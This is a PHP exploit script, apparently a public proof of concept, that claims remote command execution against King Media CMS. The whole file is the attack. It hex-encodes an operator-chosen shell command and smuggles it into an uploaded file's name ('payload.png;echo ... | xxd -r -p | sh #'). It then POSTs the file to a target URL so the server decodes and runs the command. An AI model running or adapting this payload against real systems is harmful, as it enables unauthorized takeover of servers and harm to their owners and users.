<?php
// Author: Efren Diaz (elefr3n)
// https://twitter.com/elefr3n

echo "-----------------------------------------------\n";
echo "KING MEDIA CMS REMOTE COMMAND EXECUTION EXPLOIT\n";
echo "-----------------------------------------------\n";

function strToHex($string){
    $hex = '';
    for ($i=0; $i<strlen($string); $i++){
        $ord = ord($string[$i]);
        $hexCode = dechex($ord);
        $hex .= substr('0'.$hexCode, -2);
    }
    return strToUpper($hex);
}

if (!isset($argv[1]) || !isset($argv[2]))
{
	echo "\nusage: exploit.php [target]* [command]\n\n";
} else {
	echo "\nSending request...\n\n";
	$target = $argv[1];
	$cmd_hex = strToHex($argv[2]);
	$payload = "payload.png;echo {$cmd_hex} | xxd -r -p | sh #";
	$cFile = curl_file_create($argv[0], 'video/mp4', $payload);

	$post = array(
	    'myfile'=> $cFile
	);

	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,$target);
	curl_setopt($ch, CURLOPT_POST,1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
	curl_setopt($ch, CURLOPT_HTTPHEADER, array("X-Requested-With: XMLHttpRequest"));
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

	$result=curl_exec($ch);

	echo "Command sent !";
}
